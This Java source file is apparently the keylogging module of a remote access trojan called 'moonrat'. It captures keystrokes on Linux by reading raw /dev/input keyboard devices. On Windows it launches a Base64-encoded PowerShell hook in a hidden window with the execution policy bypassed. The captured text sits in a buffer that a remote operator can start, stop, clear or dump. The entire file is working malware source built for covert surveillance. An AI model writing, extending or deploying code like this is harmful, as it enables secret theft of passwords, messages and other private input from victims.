package moonrat.client.tasks;

import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.channels.FileChannel;
import java.nio.charset.StandardCharsets;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.List;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

public final class Keylog {
    private static final int CAPACITY = 65536;
    private static final int EVENT_SIZE = 24;

    private final Object lock = new Object();
    private final StringBuilder buffer = new StringBuilder();
    private final List<FileChannel> channels = Collections.synchronizedList(new ArrayList<>());
    private volatile boolean running = false;
    private Process windowsProcess;

    public Frame handle(String action) {
        Frame response = new Frame(Protocol.KEYLOG_RESP);
        try {
            switch (action == null ? "" : action) {
                case "start":
                    response.fields = new ArrayList<>(Arrays.asList("", start()));
                    return response;
                case "stop":
                    response.fields = new ArrayList<>(Arrays.asList("", stop()));
                    return response;
                case "clear":
                    synchronized (lock) {
                        buffer.setLength(0);
                    }
                    response.fields = new ArrayList<>(Arrays.asList("", "cleared"));
                    return response;
                case "dump":
                    synchronized (lock) {
                        response.fields = new ArrayList<>(Arrays.asList("", buffer.toString()));
                    }
                    return response;
                default:
                    throw new IOException("unknown action '" + action + "'");
            }
        } catch (Exception failure) {
            response.fields = new ArrayList<>(Arrays.asList(String.valueOf(failure), ""));
            return response;
        }
    }

    public void shutdown() {
        stop();
    }

    private String start() throws Exception {
        if (running) return "already running";

        if (isWindows()) {
            windowsProcess = startWindows();
            running = true;
            return "windows powershell hook started";
        }

        List<Path> devices = findKeyboards();
        if (devices.isEmpty()) throw new IOException("no keyboard devices (need root or input group)");

        for (Path device : devices) {
            FileChannel channel = FileChannel.open(device, StandardOpenOption.READ);
            channels.add(channel);
            Thread thread = new Thread(() -> readDevice(channel), "keylog-" + device.getFileName());
            thread.setDaemon(true);
            thread.start();
        }

        running = true;
        return "capturing " + devices.size() + " device(s)";
    }

    private String stop() {
        running = false;

        synchronized (channels) {
            for (FileChannel channel : channels) {
                try {
                    channel.close();
                } catch (IOException ignored) {
                }
            }
            channels.clear();
        }

        if (windowsProcess != null) {
            windowsProcess.destroy();
            windowsProcess = null;
        }

        return "stopped";
    }

    private void readDevice(FileChannel channel) {
        ByteBuffer event = ByteBuffer.allocate(EVENT_SIZE).order(ByteOrder.LITTLE_ENDIAN);
        boolean shift = false;
        boolean ctrl = false;
        boolean caps = false;

        try {
            while (running) {
                event.clear();
                while (event.hasRemaining()) {
                    int read = channel.read(event);
                    if (read < 0) return;
                }

                event.flip();
                event.position(16);
                int type = event.getShort() & 0xffff;
                int code = event.getShort() & 0xffff;
                int value = event.getInt();
                if (type != 1) continue;

                if (code == 42 || code == 54) {
                    shift = value != 0;
                    continue;
                }
                if (code == 29 || code == 97) {
                    ctrl = value != 0;
                    continue;
                }
                if (code == 58) {
                    if (value == 1) caps = !caps;
                    continue;
                }
                if (value == 0) continue;

                String character = keyToChar(code, shift, caps);
                if (character != null) {
                    if (ctrl && character.length() == 1 && Character.isLetter(character.charAt(0))) {
                        character = "^" + character.toLowerCase();
                    }
                    append(character);
                } else if (code == 28) append("\n");
                else if (code == 15) append("[TAB]");
                else if (code == 14) append("[BS]");
                else if (code == 1) append("[ESC]");
            }
        } catch (Exception ignored) {
        }
    }

    private static String keyToChar(int code, boolean shift, boolean caps) {
        if (code >= 16 && code <= 25) {
            char character = "qwertyuiop".charAt(code - 16);
            return String.valueOf(shift ^ caps ? Character.toUpperCase(character) : character);
        }
        if (code >= 30 && code <= 38) {
            char character = "asdfghjkl".charAt(code - 30);
            return String.valueOf(shift ^ caps ? Character.toUpperCase(character) : character);
        }
        if (code >= 44 && code <= 50) {
            char character = "zxcvbnm".charAt(code - 44);
            return String.valueOf(shift ^ caps ? Character.toUpperCase(character) : character);
        }
        if (code >= 2 && code <= 11) {
            char digit = (char) ('0' + ((code - 1) % 10));
            if (!shift) return String.valueOf(digit);
            return "" + ")!@#$%^&*(".charAt(code - 2);
        }

        switch (code) {
            case 12: return shift ? "_" : "-";
            case 13: return shift ? "+" : "=";
            case 26: return shift ? "{" : "[";
            case 27: return shift ? "}" : "]";
            case 39: return shift ? ":" : ";";
            case 40: return shift ? "\"" : "'";
            case 41: return shift ? "~" : "`";
            case 43: return shift ? "|" : "\\";
            case 51: return shift ? "<" : ",";
            case 52: return shift ? ">" : ".";
            case 53: return shift ? "?" : "/";
            case 57: return " ";
            default: return null;
        }
    }

    private void append(String text) {
        synchronized (lock) {
            if (buffer.length() + text.length() > CAPACITY) {
                buffer.delete(0, buffer.length() + text.length() - CAPACITY);
            }
            buffer.append(text);
        }
    }

    private static List<Path> findKeyboards() throws IOException {
        List<Path> keyboards = new ArrayList<>();
        Path devices = Paths.get("/proc/bus/input/devices");
        if (!Files.exists(devices)) return keyboards;

        for (String block : Files.readString(devices).split("\n\n")) {
            String handlers = null;
            for (String line : block.split("\n")) {
                if (line.startsWith("H: Handlers=")) handlers = line.substring("H: Handlers=".length());
            }
            if (handlers == null || !handlers.contains("kbd")) continue;

            for (String token : handlers.split("\\s+")) {
                if (token.startsWith("event")) keyboards.add(Paths.get("/dev/input", token));
            }
        }

        return keyboards;
    }

    private Process startWindows() throws Exception {
        String script = """
$ErrorActionPreference = 'SilentlyContinue'
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class MRK {
  [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
  [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] st);
  [DllImport("user32.dll")] public static extern int ToUnicode(uint vk, uint sc, byte[] st, StringBuilder sb, int n, uint flags);
  [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint code, uint map);
}
"@
$sb = New-Object System.Text.StringBuilder 16
$prev = @{}
while ($true) {
  for ($vk = 8; $vk -le 222; $vk++) {
    $st = [MRK]::GetAsyncKeyState($vk)
    $dn = (($st -band 0x8000) -ne 0)
    if ($dn -and -not $prev[$vk]) {
      $prev[$vk] = $true
      $ks = New-Object byte[] 256
      [void][MRK]::GetKeyboardState($ks)
      $sc = [MRK]::MapVirtualKey([uint32]$vk, 0)
      [void]$sb.Clear()
      $n = [MRK]::ToUnicode([uint32]$vk, $sc, $ks, $sb, 16, 0)
      if ($n -ge 1) { [Console]::Out.Write($sb.ToString()) }
      elseif ($vk -eq 13) { [Console]::Out.Write("`n") }
      elseif ($vk -eq 8) { [Console]::Out.Write("[BS]") }
      elseif ($vk -eq 9) { [Console]::Out.Write("[TAB]") }
      [Console]::Out.Flush()
    } elseif (-not $dn) { $prev[$vk] = $false }
  }
  Start-Sleep -Milliseconds 15
}
""";

        String encoded = Base64.getEncoder().encodeToString(script.getBytes(StandardCharsets.UTF_16LE));
        ProcessBuilder builder = new ProcessBuilder("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                "-WindowStyle", "Hidden", "-EncodedCommand", encoded);
        builder.redirectErrorStream(true);

        Process process = builder.start();
        Thread reader = new Thread(() -> {
            try (InputStream stream = process.getInputStream()) {
                byte[] chunk = new byte[1024];
                int read;
                while ((read = stream.read(chunk)) > 0) {
                    append(new String(chunk, 0, read, StandardCharsets.UTF_8));
                }
            } catch (Exception ignored) {
            }
        }, "keylog-win");
        reader.setDaemon(true);
        reader.start();
        return process;
    }

    private static boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().contains("win");
    }
}
